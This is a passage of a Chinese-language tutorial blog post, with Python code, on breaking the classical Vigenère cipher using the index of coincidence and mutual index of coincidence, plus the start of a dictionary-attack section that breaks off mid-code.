class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br><span class="hljs-keyword">if</span> i  <span class="hljs-keyword">in</span> LettersZd:<br>LettersZd[i]+=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> LettersZd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getIC</span>(<span class="hljs-params">Zd</span>):<br><span class="hljs-comment">#计算重合指数</span><br>fi=<span class="hljs-number">0</span><br>n=<span class="hljs-number">0</span> <span class="hljs-comment">#总数n</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> Zd:<br>fi=fi+Zd[k]*(Zd[k]-<span class="hljs-number">1</span>)<br>n=n+Zd[k]<br><br>p=fi/(n*(n-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLenKey</span>(<span class="hljs-params">message</span>):<br><span class="hljs-comment">#得到密钥长度</span><br><span class="hljs-comment">#方法：计算子串重合指数</span><br>cnt=<span class="hljs-number">0</span><br>pi=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(Letters)):<br><span class="hljs-comment">#print(&#x27;key_length=%s&#x27;%i)</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>):<br><span class="hljs-built_in">str</span>=message[j::i]<br>LettersZd=getCnt(<span class="hljs-built_in">str</span>)<br><br>pi=getIC(LettersZd)<br><br><span class="hljs-keyword">if</span> pi&gt;<span class="hljs-number">0.055</span> <span class="hljs-keyword">and</span> pi&lt;<span class="hljs-number">0.075</span>:<br>cnt+=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> cnt==i:<br><span class="hljs-keyword">return</span> i <br><span class="hljs-keyword">break</span><br>cnt=<span class="hljs-number">0</span><br>pi=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="2-根据重合互指数得到密钥"><a href="#2-根据重合互指数得到密钥" class="headerlink" title="2.根据重合互指数得到密钥"></a>2.根据重合互指数得到密钥</h4><p>重合互指数：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210021638455.png" alt="image-20221002163842394"></p><p>当两个子串的相对位移为0时其值为0.065，不为0则都在0.3~0.4左右，故我们可以把其中一子串设为标准英语，另一子串为根据密钥长度分组后的子串，爆破26种偏移，重合互指数最大的应该是子串相对标准英语的偏移，从而确定对应密钥字母。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210021640346.png" alt="image-20221002164000301"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMI</span>(<span class="hljs-params">str_1</span>):<br><span class="hljs-comment">#计算子串与标准英语之间的重合互指数</span><br>Zd_1=[<span class="hljs-number">0.082</span>,<span class="hljs-number">0.015</span>,<span class="hljs-number">0.028</span>,<span class="hljs-number">0.043</span>,<span class="hljs-number">0.127</span>,<span class="hljs-number">0.022</span>,<span class="hljs-number">0.020</span>,<span class="hljs-number">0.061</span>,<span class="hljs-number">0.070</span>,<span class="hljs-number">0.002</span>,<span class="hljs-number">0.008</span>,<span class="hljs-number">0.040</span>,<span class="hljs-number">0.024</span>,<span class="hljs-number">0.067</span>,<span class="hljs-number">0.075</span>,<span class="hljs-number">0.019</span>,<span class="hljs-number">0.001</span>,<span class="hljs-number">0.060</span>,<span class="hljs-number">0.063</span>,<span class="hljs-number">0.091</span>,<span class="hljs-number">0.028</span>,<span class="hljs-number">0.010</span>,<span class="hljs-number">0.023</span>,<span class="hljs-number">0.001</span>,<span class="hljs-number">0.020</span>,<span class="hljs-number">0.001</span>] <span class="hljs-comment">#英语中a,b,c...z的频率</span><br>Zd_2=getCnt(str_1)<br><br>matrix_1=np.array(Zd_1)<br>matrix_2=np.array(<span class="hljs-built_in">list</span>(Zd_2.values()))  <span class="hljs-comment">#转成数组便于计算内积</span><br><br><br>n2=np.<span class="hljs-built_in">sum</span>(matrix_2)<br>pi=matrix_2/n2<br><br>Hp=np.<span class="hljs-built_in">sum</span>(pi*matrix_1)<br><br><span class="hljs-keyword">return</span> Hp<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KaiSa</span>(<span class="hljs-params">key,string</span>):<br><span class="hljs-comment">#按需偏移字符串（凯撒加密）</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string:<br>index=Letters.find(s)<br>result=result+Letters[(index+key)%<span class="hljs-built_in">len</span>(Letters)]<br><br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getListMI</span>(<span class="hljs-params">num,group</span>):<br><span class="hljs-comment">#求出num号的子串的26种偏移下的重合互指数，并返回改组中最大互指数对应的偏移</span><br>mm=<span class="hljs-number">0</span><br>result=[] <span class="hljs-comment">#存放一组重合互指数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(Letters)):<br>string=KaiSa(i,group[num])<br>x=getMI(string)<br><span class="hljs-comment">#print(x)</span><br><span class="hljs-keyword">if</span> x&gt;mm:<br>mm=x<br>key=i<br>result.append(x)<br><br><span class="hljs-keyword">return</span> result,key<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getKey</span>(<span class="hljs-params">message</span>):<br><span class="hljs-comment">#破解密钥</span><br><br>key_len=getLenKey(message)<br><br><br>group=[] <span class="hljs-comment">#按照密钥长度分组</span><br>h_key=&#123;&#125; <span class="hljs-comment">#存储偏移K</span><br>MI=&#123;&#125; <span class="hljs-comment">#储存偏移值</span><br>Letter_key=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#储存字母加密密钥</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(key_len):    <span class="hljs-comment">#按照密钥长度分组</span><br>group.append(message[i::key_len])<br><span class="hljs-comment">#print(group)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,key_len):  <span class="hljs-comment">#求出每组的所有重合互指数和最大重合互指数对应的偏移</span><br>MI[i],h_key[i]=getListMI(i,group)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(key_len):     <span class="hljs-comment">#根据偏移写出密钥，因为偏移是相对密文的，而密钥则是相对明文的，故要用26-相对密文的偏移</span><br>m=Letters[<span class="hljs-number">26</span>-h_key[i]]<br>Letter_key=Letter_key+m<br><br><span class="hljs-keyword">return</span> Letter_key<br></code></pre></td></tr></table></figure><h4 id="3-已知密钥的维吉尼亚解密"><a href="#3-已知密钥的维吉尼亚解密" class="headerlink" title="3.已知密钥的维吉尼亚解密"></a>3.已知密钥的维吉尼亚解密</h4><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">key,message</span>):<br><br>result=<span class="hljs-string">&#x27;&#x27;</span><br>l=<span class="hljs-built_in">len</span>(key)<br>j=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>index=(Letters.find(i)-Letters.find(key[j]))%<span class="hljs-number">26</span><br>j=(j+<span class="hljs-number">1</span>)%l<br>result=result+Letters[index]<br><br>text=<span class="hljs-string">&#x27; &#x27;</span>.join(wordninja.split(result))  <span class="hljs-comment">#利用wordninja分词工具自动分词，增加明文可读性</span><br><br><span class="hljs-keyword">return</span> text<br></code></pre></td></tr></table></figure><h4 id="4-完整代码及运行结果示例"><a href="#4-完整代码及运行结果示例" class="headerlink" title="4.完整代码及运行结果示例"></a>4.完整代码及运行结果示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#维吉尼亚解密：不知道密钥情况下分析密钥，求出密文(适合长密文)</span><br><span class="hljs-comment">#思路：1.求出密钥长度：方法可以用kasiski或者重合指数,这里用重合指数法</span><br><span class="hljs-comment">#重合指数法思路：爆破key长度，将一组的子串计算重合指数p^2和(近似)，每一个子串重合指数都在0.065左右的则为真实密钥长度</span><br><span class="hljs-comment">#2.破解密钥：根据重合互指数，爆破相对偏移</span><br><span class="hljs-comment">#3.求解密文:已知密钥求密文</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">表达难点：</span><br><span class="hljs-string">子串计算的处理==&gt;直接利用字符串自带的按步长分片</span><br><span class="hljs-string">重合指数的存储判断==&gt;方法一:计算平均值判断</span><br><span class="hljs-string">重合互指数需要将已满足条件的</span><br><span class="hljs-string">如何判断是约等于0.065</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> wordninja<br><br>Letters=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getCnt</span>(<span class="hljs-params">string</span>):<br><span class="hljs-comment">#统计字符出现的频率</span><br>LettersZd=&#123;<span class="hljs-string">&#x27;A&#x27;</span>:<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;B&#x27;</span>:<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br><span class="hljs-keyword">if</span> i  <span class="hljs-keyword">in</span> LettersZd:<br>LettersZd[i]+=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> LettersZd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getIC</span>(<span class="hljs-params">Zd</span>):<br><span class="hljs-comment">#计算重合指数</span><br>fi=<span class="hljs-number">0</span><br>n=<span class="hljs-number">0</span> <span class="hljs-comment">#总数n</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> Zd:<br>fi=fi+Zd[k]*(Zd[k]-<span class="hljs-number">1</span>)<br>n=n+Zd[k]<br><br>p=fi/(n*(n-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">return</span> p<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLenKey</span>(<span class="hljs-params">message</span>):<br><span class="hljs-comment">#得到密钥长度</span><br><span class="hljs-comment">#方法：计算子串重合指数</span><br>cnt=<span class="hljs-number">0</span><br>pi=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(Letters)):<br><span class="hljs-comment">#print(&#x27;key_length=%s&#x27;%i)</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>):<br><span class="hljs-built_in">str</span>=message[j::i]<br>LettersZd=getCnt(<span class="hljs-built_in">str</span>)<br><br>pi=getIC(LettersZd)<br><br><span class="hljs-keyword">if</span> pi&gt;<span class="hljs-number">0.055</span> <span class="hljs-keyword">and</span> pi&lt;<span class="hljs-number">0.075</span>:<br>cnt+=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> cnt==i:<br><span class="hljs-keyword">return</span> i <br><span class="hljs-keyword">break</span><br>cnt=<span class="hljs-number">0</span><br>pi=<span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMI</span>(<span class="hljs-params">str_1</span>):<br><span class="hljs-comment">#计算子串与标准英语之间的重合互指数</span><br>Zd_1=[<span class="hljs-number">0.082</span>,<span class="hljs-number">0.015</span>,<span class="hljs-number">0.028</span>,<span class="hljs-number">0.043</span>,<span class="hljs-number">0.127</span>,<span class="hljs-number">0.022</span>,<span class="hljs-number">0.020</span>,<span class="hljs-number">0.061</span>,<span class="hljs-number">0.070</span>,<span class="hljs-number">0.002</span>,<span class="hljs-number">0.008</span>,<span class="hljs-number">0.040</span>,<span class="hljs-number">0.024</span>,<span class="hljs-number">0.067</span>,<span class="hljs-number">0.075</span>,<span class="hljs-number">0.019</span>,<span class="hljs-number">0.001</span>,<span class="hljs-number">0.060</span>,<span class="hljs-number">0.063</span>,<span class="hljs-number">0.091</span>,<span class="hljs-number">0.028</span>,<span class="hljs-number">0.010</span>,<span class="hljs-number">0.023</span>,<span class="hljs-number">0.001</span>,<span class="hljs-number">0.020</span>,<span class="hljs-number">0.001</span>] <span class="hljs-comment">#英语中a,b,c...z的频率</span><br>Zd_2=getCnt(str_1)<br><br>matrix_1=np.array(Zd_1)<br>matrix_2=np.array(<span class="hljs-built_in">list</span>(Zd_2.values()))  <span class="hljs-comment">#转成数组便于计算内积</span><br><br><br>n2=np.<span class="hljs-built_in">sum</span>(matrix_2)<br>pi=matrix_2/n2<br><br>Hp=np.<span class="hljs-built_in">sum</span>(pi*matrix_1)<br><br><span class="hljs-keyword">return</span> Hp<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KaiSa</span>(<span class="hljs-params">key,string</span>):<br><span class="hljs-comment">#按需偏移字符串（凯撒加密）</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string:<br>index=Letters.find(s)<br>result=result+Letters[(index+key)%<span class="hljs-built_in">len</span>(Letters)]<br><br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getListMI</span>(<span class="hljs-params">num,group</span>):<br><span class="hljs-comment">#求出num号的子串的26种偏移下的重合互指数，并返回改组中最大互指数对应的偏移</span><br>mm=<span class="hljs-number">0</span><br>result=[] <span class="hljs-comment">#存放一组重合互指数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(Letters)):<br>string=KaiSa(i,group[num])<br>x=getMI(string)<br><span class="hljs-comment">#print(x)</span><br><span class="hljs-keyword">if</span> x&gt;mm:<br>mm=x<br>key=i<br>result.append(x)<br><br><span class="hljs-keyword">return</span> result,key<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getKey</span>(<span class="hljs-params">message</span>):<br><span class="hljs-comment">#破解密钥</span><br><br>key_len=getLenKey(message)<br><br><br>group=[] <span class="hljs-comment">#按照密钥长度分组</span><br>h_key=&#123;&#125; <span class="hljs-comment">#存储偏移K</span><br>MI=&#123;&#125; <span class="hljs-comment">#储存偏移值</span><br>Letter_key=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#储存字母加密密钥</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(key_len):    <span class="hljs-comment">#按照密钥长度分组</span><br>group.append(message[i::key_len])<br><span class="hljs-comment">#print(group)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,key_len):  <span class="hljs-comment">#求出每组的所有重合互指数和最大重合互指数对应的偏移</span><br>MI[i],h_key[i]=getListMI(i,group)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(key_len):     <span class="hljs-comment">#根据偏移写出密钥，因为偏移是相对密文的，而密钥则是相对明文的，故要用26-相对密文的偏移</span><br>m=Letters[(<span class="hljs-number">26</span>-h_key[i])%<span class="hljs-number">26</span>]<br>Letter_key=Letter_key+m<br><br><span class="hljs-keyword">return</span> Letter_key<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">key,message</span>):<br><br>result=<span class="hljs-string">&#x27;&#x27;</span><br>l=<span class="hljs-built_in">len</span>(key)<br>j=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>index=(Letters.find(i)-Letters.find(key[j]))%<span class="hljs-number">26</span><br>j=(j+<span class="hljs-number">1</span>)%l<br>result=result+Letters[index]<br><br>text=<span class="hljs-string">&#x27; &#x27;</span>.join(wordninja.split(result))<br><br><span class="hljs-keyword">return</span> text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>message=<span class="hljs-string">&#x27;krkpewxvftksopztecxvbuhfvycgxouflihoffptrcwffwhkcevxhiuzfposdvccyctpmjtbfymllctiwxtacsmjmoncwdnawjrwtjgjsuystvbxgvcmgczbqecllttfkjlacpfttjgeegtbvkfpmhjzqaxhvvpgxoeychrcwumchhyigixhqdciawunmjerefkekcozqttznfdjlopuyqhjgrjawcpfrgxhwiljgrgiycrqkiajfgvrlrxgkkghdbqnliaovzrltgafslacjvjexrwjrdzsvruprttfkwxfgrlstznnmjerdvjdlhkwwdngjfsawgjfunhitjcaykgrptzicibtwrcpycwbkxfibrqemivotvwdnotvldmvgicshbqkztmfqlzaxrqekntqefscmbqkfxguyzjaaorgccmcovrwxbckgdgonrqhxadcclbznjfdpzgegtgqawygxkgcjiasofqiecxvbdyageztjikvrxymqlapghcbcrtfgfdnhitjcaytqiknlsnwgrtbpfrlkwvvycraqicqnhpfrwbbizliasyfpawqqljslhqgktmccumgxmqlsemcvycsxovy&#x27;</span><br>message=message.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">#清除输入中的空格</span><br><span class="hljs-comment">#print(message)</span><br><span class="hljs-comment">#print(getLenKey(message))</span><br>s=getKey(message.upper())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;密钥为：%s&#x27;</span>%s)<br>t=decrypt(s,message.upper())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;解密结果为：%s&#x27;</span>%t)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210021656478.png" alt="image-20221002165614406"></p><h3 id="2-3字典攻击"><a href="#2-3字典攻击" class="headerlink" title="2.3字典攻击"></a>2.3字典攻击</h3><h4 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> detectEnglish,wordninja<br><br>Letters=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">key,message</span>):<br><br>result=<span class="hljs-string">&#x27;&#x27;</span><br>l=<span class="hljs-built_in">len</span>(key)<br>j=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> Letters:<br>index=(Letters.find(i)-Letters.find(key[j]))%<span class="hljs-number">26</span><br>j=(j+<span class="hljs-number">1</span>)%l<br>result=result+Letters[index]<br><span class="hljs-keyword">else</span>:<br>result=result+i<br><br>text=<span class="hljs-string">&#x27; &#x27;</span>.join(wordninja.split(result))<br><br><span class="hljs-keyword">return</span> text<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Hack</span>(<span class="hljs-params">message</span>):<br><br>fo=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dictionary.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>words=fo.readlines()    <span class="hljs-comment">#返回一个字符串列表，每个字符串是文件的一行</span><br>fo.close()<br><br><span class="hljs-comment">#开始爆破</span><br><span 